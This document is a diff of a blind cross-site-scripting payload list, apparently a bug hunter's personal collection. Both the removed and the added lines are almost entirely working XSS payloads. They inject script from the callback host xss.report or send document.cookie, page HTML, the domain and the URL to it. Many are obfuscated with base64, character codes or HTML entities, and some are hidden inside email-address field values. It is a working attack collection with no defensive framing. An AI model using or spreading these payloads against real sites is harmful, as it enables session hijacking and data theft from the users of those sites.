@@ -1,120 +1,70 @@
-'"><svg/onload=import('//xss.report/c/hnterx?q')>
-'"><img/src/onerror=import('//xss.report/c/hnterx?gp');//>
-'"><script src=https://xss.report/c/hnterx?1></script>
-`’"><script src=//xss.report/c/hnterx></script>
-`'"></script></title></textarea><script src=//xss.report/c/hnterx></script>
-';"/></textarea></script><script src="https://xss.report/c/hnterx?1"></script>
---></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/hnterx?23"></scrIpt>
-'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
-javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg*/onload=import(/https:\xss.report/c/hnterx\/.source)//>
-javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx?9/.source))//>
-'"></script></title></textarea><script src=//https://xss.report/c/hnterx?36></script>
-'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?40"></scrIpt>
---></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/hnterx?48></scrIpt>
-/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?49"></scrIpt>
-'"></title></textarea></script></style></noscript><script src=https://xss.report/c/hnterx?59></script>
-‘;"/></textarea></script><script src=//xss.report/c/hnterx?60>
-javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss.report/c/hnterx?76cookie='+document.cookie)//>
-javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/hnterx?77cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
-<textarea onfocus="fetch('https://xss.report/c/hnterx?96').then(r=>r.text()).then(eval)">Focus me</textarea>
-<textarea autofocus onfocus="location='https://xss.report/c/hnterx/?txt='+document.body.innerHTML"></textarea>
-'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
-'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
-"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8yIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?3\';document.body.appendChild(a)')
-`’"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx\';document.body.appendChild(a)')" />
-var a=document.createElement("script");a.src="https://xss.report/c/hnterx?4";document.body.appendChild(a);
-"><iframe srcdoc="<script>var a=parent.document.createElement("script");a.src="https://xss.report/c/hnterx?5";parent.document.body.appendChild(a);</script>">
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/hnterx?6");a.send();</script>
-<script>$.getScript("//xss.report/c/hnterx?7")</script>
-var a=document.createElement("script");a.src="https://xss.report/c/hnterx?8";document.body.appendChild(a);
-'"<img src="https://xss.report/c/hnterx?10" onerror='this.src="https://xss.report/c/hnterx?10"'>
-'"<img src=x onerror='this.src="https://xss.report/c/hnterx?11"'>
-'"<img src=x onerror='fetch("https://xss.report/c/hnterx?12",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
-'"<iframe src='javascript:window.location="https://xss.report/c/hnterx?13"'></iframe>
-'"<iframe srcdoc='<script>window.location="https://xss.report/c/hnterx?14"</script>'></iframe>
-'"<iframe srcdoc='<script>fetch("https://xss.report/c/hnterx?15",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
-'"<object data='javascript:window.location="https://xss.report/c/hnterx?16"'></object>
-<input onfocus='fetch("https://xss.report/c/hnterx?17",{method:"POST",mode:"no-cors"})' autofocus>
-'"<script type="text/javascript" src="https://xss.report/c/hnterx?18"></script>
-'"<script type="module" src="https://xss.report/c/hnterx?19"></script>
-'"<script nomodule src="https://xss.report/c/hnterx?20"></script>
-javascript:window.location="https://xss.report/c/hnterx?21"
-javascript:fetch("https://xss.report/c/hnterx?22")
-'"<img src="https://xss.report/c/hnterx?24" onerror="this.src='https://xss.report/c/hnterx?24'">
-'"<svg/onload="window.location.href='https://xss.report/c/hnterx?25'">
-'"<audio src onerror='fetch("https://xss.report/c/hnterx?26",{method:"POST",mode:"no-cors"})'>
-'"<script>new Image().src="https://xss.report/c/hnterx?27"</script>
-'"<form action="https://xss.report/c/hnterx?28" method="POST"><input name="data" value=""></form><script>document.forms[0].submit();</script>
-'"<iframe src="javascript:fetch('https://xss.report/c/hnterx?29')"></iframe>
-'"<link rel="stylesheet" href="https://xss.report/c/hnterx?30" onerror='fetch("https://xss.report/c/hnterx?30")'>
-'"<meta http-equiv="refresh" content="0;url=https://xss.report/c/hnterx?31">
-'"<object data="https://xss.report/c/hnterx?31" onerror='this.data="https://xss.report/c/hnterx?31"'></object>
-javascript:fetch("https://xss.report/c/hnterx?32")
-'"<svg/onload="fetch('https://xss.report/c/hnterx?33'">
-{constructor.constructor('fetch("https://xss.report/c/hnterx?34"')()}
-'"<img src=x onerror="fetch('https://xss.report/c/hnterx?35')">
-'"<svg/onload='var a="fetch";var b="https://xss.report/c/hnterx?37"; setTimeout(a+"(b)",1000)'>
-'"<iframe src="javascript:setTimeout('fetch(\"https://xss.report/c/hnterx?38\")', 1000)"></iframe>
-'"<form id='xss'><button form='xss' formaction='javascript:fetch("https://xss.report/c/hnterx?39")'>Click Me</button></form>
-'"><img src=x onerror=setTimeout(String.fromCharCode(102,101,116,99,104)+'("https://xss.report/c/hnterx?41")', 0)>
-'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/hnterx?42")></script>
-'"?><svg/onload="fetch('https://xss.report/c/hnterx?43cookie='+document.cookie)"//>
-<img src=x onerror="setTimeout(function(){fetch('https://xss.report/c/hnterx?44data='+document.cookie)},10)"//>
-<input autofocus onfocus="fetch('https://xss.report/c/hnterx?45token='+document.cookie)"//>
-<iframe src="javascript:void(0)" onload="fetch('https://xss.report/c/hnterx?46url='+location.href)"//><!--" -->
-</noscript><script src=https://xss.report/c/hnterx?47></script>
--'"><Svg Src=//xss.report/c/hnterx?50 OnLoad=import(this.getAttribute('src')+0)>
-<input onmouseover="fetch('https://xss.report/c/hnterx?52cookie='+document.cookie)">
-'"><Svg Src=//xss.report/c/hnterx?53 OnLoad=import(this.getAttribute('src')+0)>
-'"><Img Src=//xss.report/c/hnterx?54 Onload=import(src+0)>
-'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:https://xss.report/c/hnterx?55\00?1=1290/.source))//>
-\"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location='https://xss.report/c/hnterx?56c='+Reflect.get(document,'coo'+'kie')">
-\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/hnterx?57'">
-{globalThis.constructor("fetch('https://xss.report/c/hnterx?64cookie='+document.cookie)")()}
-<p><img src="https://xss.report/c/hnterx?58" border="0" />--&gt;</p>
-email]=zer0_sec+1"><script src="https://xss.report/c/hnterx?51"></script>@h6nt3r@gmail.com
-zer0_sec 1"><script src="https://xss.report/c/hnterx?61"></script>@h6nt3r@gmail.com
-h6nt3r@gmail.com"><script src="https://xss.report/c/hnterx?62"></script>
-h6nt3r@gmail.com"><script src="https://xss.report/c/hnterx?63"></script>
-h6nt3r@gmail.com<!--" --><script src=https://xss.report/c/hnterx?65></script>
-h6nt3r@gmail.com"><script src="https://xss.report/c/hnterx?"66></script>
-h6nt3r@gmail.com"><svg onload="fetch('https://xss.report/c/hnterx?67cookie='+document.cookie)"></svg>
-<iframe src="https://xss.report" onload="fetch('https://xss.report/c/hnterx?68cookie=' + document.cookie)"></iframe>
-</script><Iframe SrcDoc="><script src=https://xss.report/c/hnterx?69></script>">
-</script><Iframe SrcDoc=""><script src=https://xss.report/c/hnterx?70></script>">
-//'"><script src=https://xss.report/c/hnterx?71></script>
-'"><script src=https://xss.report/c/hnterx?72></script>
-<img src=x onerror=fetch('https://xss.report/c/hnterx?73c='+document.cookie)>
-javascript://"><script src=https://xss.report/c/hnterx?74></script>
-javascript://'"><svg onmouseover="fetch('https://xss.report/c/hnterx?75data='+document.cookie)"></svg>
-'//><scrIpt src=//xss.report/c/hnterx?78></scrIpt>
-{{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD85OTsiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\'))')()}}
-<="" script=""><script src="//xss.report/c/hnterx?100"></script>
-"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8xMDMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
-<iframe/onload​='this["src"]="javas&Tab;cript​:location=`//https://xss.report/c/hnterx"';>
-`’"><iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/hnterx';document.body.appendChild(a)"></iframe>
-`’"><div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/hnterx';document.body.appendChild(a)">Hover me</div>
-`’"><audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/hnterx';document.body.appendChild(a)">
-`’"><body onload="var a=document.createElement('script');a.src='https://xss.report/c/hnterx';document.body.appendChild(a)">
-<script>fetch("//xss.report/c/hnterx").then(r=>r.text()).then(t=>eval(t))</script>
-<iframe srcdoc="<script src='https://xss.report/c/hnterx'></script>"></iframe>
-<video><source onerror="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))"></video>
-<details open ontoggle="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))"></details>
-<svg><desc><![CDATA[</desc><script src="https://xss.report/c/hnterx"></script>]]></svg>
-<style>@import url(https://xss.report/c/hnterx);</style>
-<math href="javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))"></math>
-<svg><foreignObject><iframe srcdoc="<script src='https://xss.report/c/hnterx'></script>"></iframe></foreignObject></svg>
-<img src=1 onerror=eval(String.fromCharCode(118,97,114,32,97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,97,46,115,114,99,61,39,104,116,116,112,115,58,47,47,120,115,115,46,114,101,112,111,114,116,47,99,47,104,110,116,101,114,120,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,97,41))>
-<input autofocus onfocus="new Image().src='https://xss.report/c/hnterx/?c='+document.cookie">
-<input onfocus=eval(atob('dmFyIGMgPSBuZXcgSW1hZ2UoKTtjLnNyYz0naHR0cHM6Ly94c3MucmVwb3J0L2MvaG50ZXJ4Pytnb2NjdW1lbnQuY29va2llOw==')) autofocus>
-<img src="x" onerror="new Image().src='https://xss.report/c/hnterx/?e='+document.domain">
-<div contenteditable onfocus="fetch('https://xss.report/c/hnterx/?x='+document.location)"></div>
-<svg><a xlink:href="https://xss.report/c/hnterx"><rect onfocus="this.href.baseVal='https://xss.report/c/hnterx?svgfocus='+document.domain" tabindex="1"/></a></svg>
-<iframe src="javascript:parent.location='https://xss.report/c/hnterx?frame='+document.domain"></iframe>
-<video src onerror="fetch('https://xss.report/c/hnterx?videofail='+document.cookie)"></video>
-<details open ontoggle="new Image().src='https://xss.report/c/hnterx?toggle='+document.cookie"></details>
-<marquee onstart="fetch('https://xss.report/c/hnterx?marquee='+document.cookie)">BLIND XSS</marquee>
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx' /*iframe/src*/>
-1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx')//
-">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx'>
+'"><script src=https://xss.report/c/hnterx></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx\';document.body.appendChild(a)')
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8zIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/hnterx");a.send();</script>
+var a=document.createElement("script");a.src="https://xss.report/c/hnterx?5";document.body.appendChild(a);
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?6\';document.body.appendChild(a)')" />
+<div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?7';document.body.appendChild(a)">Hover me</div>
+<body onload="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?8';document.body.appendChild(a)">
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD85Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8xMCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/hnterx&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>$.getScript("//xss.report/c/hnterx?12")</script>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx/.source))//>
+<iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/hnterx?14';document.body.appendChild(a)"></iframe>
+<audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?15';document.body.appendChild(a)">
+<script>fetch("//xss.report/c/hnterx?16").then(r=>r.text()).then(t=>eval(t))</script>
+xss0r payloads
+"><div autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?16'"></div>
+<input autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?17';">
+"><video><source onerror="new Function(String.fromCharCode(118,97,114,32,97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,97,46,115,114,99,61,34,104,116,116,112,115,58,47,47,120,115,115,46,114,101,112,111,114,116,47,99,47,104,110,116,101,114,120,63,49,56,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,97,41,59))()">
+">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?19'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?20'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx/.source))//>
+"><script src=//xss.report/c/hnterx?21></script><svg/onload="fetch('//xss.report/c/hnterx?21')"></svg><video src=1 onerror="import('//xss.report/c/hnterx?21')"></video><iframe srcdoc='<script>document.location="//xss.report/c/hnterx?21"</script>'></iframe><img src=x onerror="new Function(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaHVudGVyZXgiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))()"><body onload='fetch("//xss.report/c/hnterx?21")' onerror="document.write('<script src=//xss.report/c/hnterx?21></script>')"><div style='background:url(javascript:fetch("//xss.report/c/hnterx?21"))'></div><a href="javascript:fetch('//xss.report/c/hnterx?21')">Click me</a><iframe onload="document.body.appendChild(document.createElement('script')).src='//xss.report/c/hnterx?21'"></iframe><script>setTimeout(()=>{let s=document.createElement('script');s.src='//xss.report/c/hnterx?21';document.body.appendChild(s);},0)</script>
+'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8yMiI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
+'"><img src=x onerror="eval(atob('dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTthLnNyYyA9ICdodHRwczovL3hzcy5yZXBvcnQvYy9obnRlcng/MjMnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))">
+"><img src=x onerror="var a = document.createElement('script'); a.src='https://xss.report/c/hnterx?24'; document.body.appendChild(a);">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?25' /*iframe/src*/>
+"><iframe srcdoc="&#60;script&#62;document.location='https://xss.report/c/hnterx?26'&#60;/script&#62;">
+"><img src=x onerror="document.body.appendChild(document.createElement('script')).src=String.fromCharCode(104 116 116 112 115 58 47 47 120 115 115 46 114 101 112 111 114 116 47 99 47 104 110 116 101 114 120 63 50 55)">
+"><audio src=x onerror="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?28'"></audio>
+"><svg onload="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/hnterx?29'"></svg>
+"><iframe srcdoc='&#60;iframe srcdoc=&#34;&#60;script&#62;document.location=&#34;https://xss.report/c/hnterx?30&#34;&#60;/script&#62;&#34;&#62;&#60;/iframe&#62;'></iframe>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https://xss.report/c/hnterx?31/.source))//>
+'"><script/**/src=https://xss.report/c/hnterx?32></script>
+'"<script type="text/javascript" src="https://xss.report/c/hnterx?33"></script>
+'"<script type="module" src="https://xss.report/c/hnterx?34"></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/hnterx?35"></scrIpt>
+"\"></script></title></textarea><script src='https://xss.report/c/hnterx?36'></script>"
+'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?37"></scrIpt>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/hnterx?38></script>
+ibrahim'"<script src=https://xss.report/c/hnterx?39></script>
+ibro%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3E%3C%2Fscript%3E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/hnterx?40></scrIpt>
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?41"></scrIpt>
+\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/hnterx?42'">
+<p><img src="https://xss.report/c/hnterx?43" border="0" />--&gt;</p>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/hnterx?44></script>
+<script>$.getScript("https://xss.report/c/hnterx?45")</script>
+';"/></textarea></script><script src="https://xss.report/c/hnterx?46"></script>
+zer0_sec 1"><script src="https://xss.report/c/hnterx?47"></script>@ibro1337@gmail.com
+ibro1337@gmail.com"><script src="https://xss.report/c/hnterx?48"></script>
+ibro1337@gmail.com<!--" --><script src=https://xss.report/c/hnterx?49></script>
+</script><Iframe SrcDoc="><script src=https://xss.report/c/hnterx?50></script>">
+%3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3E%3C%2Fscript%3E%22%3E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/hnterx?51"></scrIpt>
+Collected bxss
+`â€™"><script src=//xss.report/c/hnterx?52></script>
+`'"></script></title></textarea><script src=//xss.report/c/hnterx?53></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="//xss.report/c/hnterx?54"></scrIpt>
+`'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD81NSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
+`â€™"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD81NiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
+`â€™"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD81NyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg*/onload=import(/https:\xss.report/c/hnterx?58\/.source)//>
+`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/hnterx?59\';document.body.appendChild(a)')" />
+`â€™"><iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/hnterx?60';document.body.appendChild(a)"></iframe>
+`â€™"><div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?61';document.body.appendChild(a)">Hover me</div>
+`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?62';document.body.appendChild(a)">
+`â€™"><body onload="var a=document.createElement('script');a.src='https://xss.report/c/hnterx?63';document.body.appendChild(a)">
+<script>fetch("//xss.report/c/hnterx?64").then(r=>r.text()).then(t=>eval(t))</script>
+<iframe srcdoc="<script src='https://xss.report/c/hnterx?65'></script>"></iframe>
